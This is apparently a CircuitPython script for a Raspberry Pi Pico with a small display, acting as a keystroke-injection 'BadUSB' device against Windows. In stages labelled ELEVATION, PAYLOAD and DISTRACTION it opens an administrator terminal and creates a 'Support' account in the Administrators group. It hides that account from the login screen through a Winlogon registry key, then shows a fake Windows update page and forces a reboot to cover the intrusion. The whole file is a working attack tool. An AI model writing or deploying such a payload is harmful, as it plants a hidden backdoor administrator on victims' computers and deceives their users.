import time
import os
import usb_hid
import digitalio
import board
import busio
import terminalio
import displayio
from adafruit_display_text import label
from adafruit_hid.keyboard import Keyboard, Keycode
from keyboard_layout_win_de import KeyboardLayout
from adafruit_st7789 import ST7789

# Constants for the display settings
BORDER = 12
FONTSCALE = 3
BACKGROUND_COLOR = 0xFF0000  # Red background color
FOREGROUND_COLOR = 0xFFFF00  # Yellow foreground color
TEXT_COLOR = 0x0000FF  # Blue text color

# Release any existing displays
displayio.release_displays()

# Define the pins for the TFT display
tft_clk = board.GP10
tft_mosi = board.GP11
tft_rst = board.GP12
tft_dc = board.GP8
tft_cs = board.GP9

# Create the SPI bus for communication with the TFT display
spi = busio.SPI(clock=tft_clk, MOSI=tft_mosi)

# Initialize the TFT display
display_bus = displayio.FourWire(spi, command=tft_dc, chip_select=tft_cs, reset=tft_rst)
display = ST7789(
    display_bus, rotation=270, width=240, height=135, rowstart=40, colstart=53
)

# Create a splash group to hold the display elements
splash = displayio.Group()
display.show(splash)

# Create the background color bitmap and palette
color_bitmap = displayio.Bitmap(display.width, display.height, 1)
color_palette = displayio.Palette(1)
color_palette[0] = BACKGROUND_COLOR

# Create the background sprite and add it to the splash group
tft_bl = board.GP13
led = digitalio.DigitalInOut(tft_bl)
led.direction = digitalio.Direction.OUTPUT
led.value = True

bg_sprite = displayio.TileGrid(color_bitmap, pixel_shader=color_palette, x=0, y=0)
splash.append(bg_sprite)


def inner_rectangle():
    """
    The inner_rectangle function creates a bitmap and palette for the inner rectangle.
    The bitmap is created with a width of display.width - BORDER * 2, which is the same as
    display.width - (BORDER + BORDER). The height of the bitmap is also calculated in this way:
    display.height - (BORDER + BORDER). This means that we are creating a rectangle that has an area
    equal to display_area minus twice the border size.

    :return: A rectangle that is smaller than the outer one
    """

    inner_bitmap = displayio.Bitmap(
        display.width - BORDER * 2, display.height - BORDER * 2, 1
    )
    inner_palette = displayio.Palette(1)
    inner_palette[0] = FOREGROUND_COLOR
    inner_sprite = displayio.TileGrid(
        inner_bitmap, pixel_shader=inner_palette, x=BORDER, y=BORDER
    )
    splash.append(inner_sprite)


def print_onTFT(text, x_pos, y_pos):
    """
    The print_onTFT function takes three arguments:
        text - the string to be printed on the TFT display
        x_pos - the horizontal position of where you want your text to start printing (in pixels)
        y_pos - the vertical position of where you want your text to start printing (in pixels)

    :param text: Set the text that will be displayed on the tft screen
    :param x_pos: Set the x position of the text on screen
    :param y_pos: Set the y position of the text on the screen
    :return: The text_group object
    """

    # Create a label with the provided text and color
    text_area = label.Label(terminalio.FONT, text=text, color=TEXT_COLOR)
    text_group = displayio.Group(
        scale=FONTSCALE,
        x=x_pos,
        y=y_pos,
    )
    text_group.append(text_area)
    splash.append(text_group)


# Main code starts here
try:
    # Display the first inner rectangle with the title "ELEVATION" in the center
    inner_rectangle()
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayout(keyboard)
    print_onTFT("ELEVATION", 60, 40)

    # Simulate pressing the Windows+D keys to minimize all windows
    time.sleep(1)
    keyboard.send(Keycode.WINDOWS, Keycode.D)
    keyboard.send(Keycode.WINDOWS, Keycode.X)
    time.sleep(0.3)
    keyboard.send(Keycode.A)
    keyboard.release_all()
    time.sleep(1)

    # Simulate pressing the left arrow key
    keyboard.send(Keycode.LEFT_ARROW)

    # Simulate pressing the Enter key
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)
    keyboard.release_all()
    print_onTFT("COMPLETE", 60, 80)

    time.sleep(1)

    # Display the second inner rectangle with the title "PAYLOAD" in the center
    inner_rectangle()
    print_onTFT("PAYLOAD", 60, 40)

    # Simulate typing commands to add a new user and add them to the Administrators group
    keyboard_layout.write("net user Support Support /add")
    time.sleep(0.5)
    keyboard.send(Keycode.ENTER)

    keyboard_layout.write("net localgroup Administrators Support /add")
    time.sleep(0.5)
    keyboard.send(Keycode.ENTER)

    keyboard_layout.write(
        'reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist" /v Support /t REG_DWORD /d 0 /f'
    )
    time.sleep(0.5)
    keyboard.send(Keycode.ENTER)

    print_onTFT("COMPLETE", 60, 80)
    time.sleep(1)

    # Display the third inner rectangle with the title "DISTRACTION" in the center
    inner_rectangle()
    print_onTFT("DISTRACTION", 60, 40)

    # Simulate typing a PowerShell command to open a fake Windows update page and then reboot
    keyboard_layout.write(
        'Start-Process "https://fakeupdate.net/win10ue/"; shutdown /r /t 20; exit'
    )
    keyboard.send(Keycode.ENTER)
    time.sleep(2)
    keyboard.send(Keycode.Enter)
    keyboard.send(Keycode.F11)

    # Display the fourth inner rectangle with the title "COMPLETE" in the center
    inner_rectangle()
    print_onTFT("COMPLETE", 60, 80)

    keyboard.release_all()

except Exception as ex:
    keyboard.release_all()
    raise ex
